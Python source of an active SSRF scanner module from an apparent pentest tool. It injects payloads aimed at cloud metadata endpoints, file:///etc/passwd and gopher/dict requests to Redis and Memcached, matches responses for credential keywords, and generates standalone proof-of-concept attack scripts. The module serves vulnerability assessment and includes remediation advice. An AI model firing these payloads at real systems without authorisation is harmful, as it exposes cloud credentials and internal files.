"""
Active vulnerability scanner for SSRF (Server-Side Request Forgery).
"""

import asyncio
import uuid
from typing import Dict, List, Optional, Set, Any
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
import logging

from pentest_scanner.utils.http_client import HTTPClient, ResponseWrapper
from pentest_scanner.utils.models import (
    Vulnerability, Severity, VulnerabilityCategory, CVSSScore,
    Evidence, ScanResult, HTTPRequest, HTTPResponse
)
from pentest_scanner.config.settings import (
    SSRF_PAYLOADS, SEVERITY_CVSS_MAP
)

logger = logging.getLogger(__name__)


class SSRFScanner:
    """Server-Side Request Forgery vulnerability scanner."""
    
    def __init__(self, client: HTTPClient, config, scan_result: ScanResult):
        self.client = client
        self.config = config
        self.scan_result = scan_result
        self.tested_parameters: Set[str] = set()
        self.callback_server = None  # For OOB detection
    
    async def run(self, endpoints: List) -> Dict[str, Any]:
        """Run SSRF scans on discovered endpoints."""
        results = {
            "vulnerabilities_found": 0,
            "parameters_tested": 0,
            "ssrf_findings": [],
        }
        
        for endpoint in endpoints:
            if hasattr(endpoint, 'url'):
                url = endpoint.url
            else:
                url = endpoint.get('url', '')
            
            if not url:
                continue
            
            # Test URL parameters
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param_name, param_values in params.items():
                if param_name in self.tested_parameters:
                    continue
                self.tested_parameters.add(param_name)
                results["parameters_tested"] += 1
                
                # Test SSRF payloads
                for payload in SSRF_PAYLOADS[:10]:
                    vuln = await self._test_ssrf(url, param_name, payload)
                    if vuln:
                        results["vulnerabilities_found"] += 1
                        results["ssrf_findings"].append(vuln.to_dict())
                        break
            
            # Test form parameters
            if hasattr(endpoint, 'forms') and endpoint.forms:
                for form in endpoint.forms:
                    await self._test_form_ssrf(url, form, results)
        
        return results
    
    async def _test_ssrf(self, url: str, param_name: str, payload: str) -> Optional[Vulnerability]:
        """Test for SSRF in a URL parameter."""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param_name] = [payload]
            new_query = urlencode(params, doseq=True)
            test_url = parsed._replace(query=new_query).geturl()
            
            response = await self.client.get(test_url)
            wrapper = ResponseWrapper(response)
            body = await wrapper.text()
            
            # Check for indicators of successful SSRF
            ssrf_indicators = self._check_ssrf_indicators(body, response.status, payload)
            
            if ssrf_indicators:
                # Determine severity based on target
                severity = self._assess_ssrf_severity(payload, ssrf_indicators)
                
                vuln = Vulnerability(
                    id=f"SSRF_{uuid.uuid4().hex[:8].upper()}",
                    title=f"Server-Side Request Forgery (SSRF) in parameter '{param_name}'",
                    description=f"Parameter '{param_name}' is vulnerable to SSRF. The server makes requests to user-supplied URLs, allowing access to internal resources.",
                    category=VulnerabilityCategory.SSRF,
                    severity=severity,
                    cvss=CVSSScore(**SEVERITY_CVSS_MAP[severity.value]),
                    owasp_category="A10:2021 – Server-Side Request Forgery (SSRF)",
                    url=test_url,
                    parameter=param_name,
                    method="GET",
                    poc=f"Payload: {payload}",
                    poc_code=self._generate_ssrf_poc(test_url, param_name, payload),
                    remediation="Validate and sanitize user-supplied URLs. Use allowlists for allowed domains/IPs. Block access to internal IPs (127.0.0.1, 169.254.169.254, 10.x, 172.16-31.x, 192.168.x). Implement network segmentation.",
                    references=[
                        "https://owasp.org/www-project-top-ten/2021/A10_2021-Server-Side_Request_Forgery_%28SSRF%29",
                        "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
                        "https://portswigger.net/web-security/ssrf"
                    ],
                    tags=["active", "ssrf", "injection"],
                    confirmed=True
                )
                
                vuln.evidence.append(Evidence(
                    type="response",
                    description="SSRF indicators detected in response",
                    data={"payload": payload, "indicators": ssrf_indicators}
                ))
                vuln.request = HTTPRequest(method="GET", url=test_url)
                vuln.response = HTTPResponse(
                    status_code=response.status,
                    headers=dict(response.headers),
                    body=body[:2000],
                    url=test_url
                )
                
                self.scan_result.add_vulnerability(vuln)
                return vuln
                
        except Exception as e:
            logger.debug(f"Error testing SSRF on {url} param {param_name}: {e}")
        
        return None
    
    def _check_ssrf_indicators(self, body: str, status_code: int, payload: str) -> List[str]:
        """Check response for indicators of successful SSRF."""
        indicators = []
        body_lower = body.lower()
        
        # Check for cloud metadata service responses
        if "169.254.169.254" in payload:
            if any(keyword in body_lower for keyword in [
                "ami-id", "instance-id", "local-ipv4", "public-ipv4",
                "security-groups", "iam", "role", "access-key", "secret-key",
                "compute/internal", "metadata.google.internal"
            ]):
                indicators.append("cloud_metadata_access")
        
        # Check for localhost/internal service responses
        if any(ip in payload for ip in ["127.0.0.1", "localhost", "0.0.0.0", "[::1]"]):
            if any(keyword in body_lower for keyword in [
                "ssh-", "openssh", "apache", "nginx", "iis", "tomcat",
                "mysql", "postgresql", "mongodb", "redis", "memcached",
                "elasticsearch", "kibana", "grafana", "prometheus",
                "jenkins", "gitlab", "jira", "confluence"
            ]):
                indicators.append("internal_service_access")
        
        # Check for file protocol access
        if "file://" in payload:
            if any(keyword in body_lower for keyword in [
                "root:", "daemon:", "bin:", "sys:", "sync:", "games:",
                "man:", "lp:", "mail:", "news:", "uucp:", "proxy:",
                "www-data:", "backup:", "list:", "irc:", "gnats:",
                "nobody:", "systemd:", "messagebus:", "sshd:"
            ]):
                indicators.append("file_protocol_access")
        
        # Check for internal network access (RFC1918)
        if any(ip in payload for ip in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168."]):
            if status_code == 200 and len(body) > 100:
                indicators.append("internal_network_access")
        
        # Check for DNS rebinding / external domain
        if payload.startswith("http://") or payload.startswith("https://"):
            if status_code == 200 and len(body) > 100:
                # Could indicate external request was made
                indicators.append("external_request_made")
        
        # Check for protocol handlers
        for proto in ["dict://", "gopher://", "ftp://", "ldap://", "tftp://"]:
            if proto in payload:
                indicators.append(f"{proto[:-3]}_protocol_handler")
        
        return indicators
    
    def _assess_ssrf_severity(self, payload: str, indicators: List[str]) -> Severity:
        """Assess SSRF severity based on payload and indicators."""
        # Critical: Cloud metadata access
        if "cloud_metadata_access" in indicators:
            return Severity.CRITICAL
        
        # High: Internal service access, file protocol
        if "internal_service_access" in indicators or "file_protocol_access" in indicators:
            return Severity.HIGH
        
        # Medium: Internal network access
        if "internal_network_access" in indicators:
            return Severity.MEDIUM
        
        # Low: External request made, protocol handlers
        if "external_request_made" in indicators or any(i.endswith("_protocol_handler") for i in indicators):
            return Severity.MEDIUM
        
        return Severity.LOW
    
    async def _test_form_ssrf(self, url: str, form: Dict, results: Dict):
        """Test SSRF in form inputs."""
        action = form.get('action', '')
        method = form.get('method', 'GET').upper()
        inputs = form.get('inputs', [])
        
        if not action:
            action = url
        elif not action.startswith('http'):
            action = urljoin(url, action)
        
        for input_field in inputs:
            input_name = input_field.get('name', '')
            input_type = input_field.get('type', 'text')
            
            if not input_name or input_type in ['submit', 'button', 'image', 'hidden', 'token', 'csrf']:
                continue
            
            if input_name in self.tested_parameters:
                continue
            self.tested_parameters.add(input_name)
            results["parameters_tested"] += 1
            
            for payload in SSRF_PAYLOADS[:5]:
                vuln = await self._test_form_input_ssrf(action, method, input_name, payload, inputs)
                if vuln:
                    results["vulnerabilities_found"] += 1
                    results["ssrf_findings"].append(vuln.to_dict())
                    break
    
    async def _test_form_input_ssrf(self, action: str, method: str, input_name: str, payload: str, all_inputs: List) -> Optional[Vulnerability]:
        """Test SSRF in a specific form input."""
        try:
            # Build form data
            form_data = {}
            for inp in all_inputs:
                name = inp.get('name', '')
                if name == input_name:
                    form_data[name] = payload
                elif inp.get('type') not in ['submit', 'button', 'image']:
                    form_data[name] = inp.get('value', 'test')
            
            # Make request
            if method == "POST":
                response = await self.client.post(action, data=form_data)
            else:
                response = await self.client.get(action, params=form_data)
            
            wrapper = ResponseWrapper(response)
            body = await wrapper.text()
            
            ssrf_indicators = self._check_ssrf_indicators(body, response.status, payload)
            
            if ssrf_indicators:
                severity = self._assess_ssrf_severity(payload, ssrf_indicators)
                
                vuln = Vulnerability(
                    id=f"SSRF_FORM_{uuid.uuid4().hex[:8].upper()}",
                    title=f"SSRF in form input '{input_name}'",
                    description=f"Form input '{input_name}' is vulnerable to SSRF via {method} request.",
                    category=VulnerabilityCategory.SSRF,
                    severity=severity,
                    cvss=CVSSScore(**SEVERITY_CVSS_MAP[severity.value]),
                    owasp_category="A10:2021 – Server-Side Request Forgery (SSRF)",
                    url=action,
                    parameter=input_name,
                    method=method,
                    poc=f"Submit form to {action} with {input_name}={payload}",
                    poc_code=self._generate_form_ssrf_poc(action, method, input_name, payload, form_data),
                    remediation="Validate and sanitize user-supplied URLs. Use allowlists for allowed domains/IPs. Block access to internal IPs. Implement network segmentation.",
                    references=[
                        "https://owasp.org/www-project-top-ten/2021/A10_2021-Server-Side_Request_Forgery_%28SSRF%29",
                        "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
                    ],
                    tags=["active", "ssrf", "form", "injection"],
                    confirmed=True
                )
                
                vuln.evidence.append(Evidence(
                    type="response",
                    description="SSRF indicators detected in form response",
                    data={"payload": payload, "input": input_name, "indicators": ssrf_indicators}
                ))
                vuln.request = HTTPRequest(method=method, url=action, body=str(form_data))
                vuln.response = HTTPResponse(
                    status_code=response.status,
                    headers=dict(response.headers),
                    body=body[:2000],
                    url=str(response.url)
                )
                
                self.scan_result.add_vulnerability(vuln)
                return vuln
                
        except Exception as e:
            logger.debug(f"Error testing form SSRF: {e}")
        
        return None
    
    def _generate_ssrf_poc(self, url: str, param: str, payload: str) -> str:
        """Generate proof of concept code for SSRF."""
        return f"""#!/usr/bin/env python3
\"\"\"
Proof of Concept for Server-Side Request Forgery (SSRF)
Target: {url}
Parameter: {param}
\"\"\"

import requests
from urllib.parse import urlencode

# Target URL
base_url = "{url.split('?')[0]}"
param_name = "{param}"

# SSRF payloads to test
payloads = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
    "file:///etc/passwd",
    "dict://localhost:11211/stat",  # Memcached
    "gopher://127.0.0.1:6379/_INFO",  # Redis
]

print("[+] Testing SSRF payloads:")

for payload in payloads:
    params = {{param_name: payload}}
    test_url = f"{{base_url}}?{{urlencode(params)}}"
    print(f"\\n[+] Testing: {{test_url}}")
    
    try:
        response = requests.get(test_url, timeout=10)
        print(f"    Status: {{response.status_code}}")
        print(f"    Length: {{len(response.text)}}")
        
        # Check for indicators
        if "ami-id" in response.text or "instance-id" in response.text:
            print("    [!!!] AWS METADATA ACCESS - CRITICAL")
        elif "compute/internal" in response.text:
            print("    [!!!] GCP METADATA ACCESS - CRITICAL")
        elif "root:" in response.text:
            print("    [!!!] FILE SYSTEM ACCESS - HIGH")
        elif any(svc in response.text.lower() for svc in ["ssh", "mysql", "redis", "memcached"]):
            print("    [!!!] INTERNAL SERVICE ACCESS - HIGH")
            
    except Exception as e:
        print(f"    Error: {{e}}")

print(f"\\n[+] Original vulnerable URL: {url}")
"""
    
    def _generate_form_ssrf_poc(self, action: str, method: str, input_name: str, payload: str, form_data: Dict) -> str:
        """Generate PoC code for form-based SSRF."""
        return f"""#!/usr/bin/env python3
\"\"\"
Proof of Concept for Form-based SSRF
Target: {action}
Method: {method}
Parameter: {input_name}
\"\"\"

import requests

# Target URL
target_url = "{action}"
method = "{method}"

# Form data with SSRF payload
form_data = {form_data}
form_data["{input_name}"] = "{payload}"

print(f"[+] Testing SSRF via form submission to {{target_url}}")

try:
    if method == "POST":
        response = requests.post(target_url, data=form_data, timeout=10)
    else:
        response = requests.get(target_url, params=form_data, timeout=10)
    
    print(f"    Status: {{response.status_code}}")
    print(f"    Length: {{len(response.text)}}")
    
    # Check for indicators
    if "ami-id" in response.text or "instance-id" in response.text:
        print("    [!!!] AWS METADATA ACCESS - CRITICAL")
    elif "compute/internal" in response.text:
        print("    [!!!] GCP METADATA ACCESS - CRITICAL")
    elif "root:" in response.text:
        print("    [!!!] FILE SYSTEM ACCESS - HIGH")
    elif any(svc in response.text.lower() for svc in ["ssh", "mysql", "redis", "memcached"]):
        print("    [!!!] INTERNAL SERVICE ACCESS - HIGH")

except Exception as e:
    print(f"    Error: {{e}}")

print(f"\\n[+] Manual test: Submit form to {{target_url}} with {input_name}={payload}")
"""